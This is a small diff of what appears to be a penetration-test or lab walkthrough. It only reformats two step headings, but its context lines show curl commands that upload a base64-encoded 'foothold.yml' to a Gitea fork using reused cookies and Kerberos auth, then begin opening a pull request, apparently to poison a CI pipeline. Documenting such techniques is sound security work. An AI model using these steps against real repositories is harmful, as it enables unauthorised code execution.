@@ -315,9 +315,7 @@ EOF
 cat /tmp/foothold.yml
 ```
 
-**3.22 — upload to fork**
-
-bash
+### Upload to fork
 
 ```bash
 B64=$(base64 -w0 /tmp/foothold.yml)
@@ -330,9 +328,7 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
   | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name','')); print('msg:', d.get('message',''))"
 ```
 
-**3.23 — open PR**
-
-bash
+### Open PR
 
 ```bash
 PR=$(curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
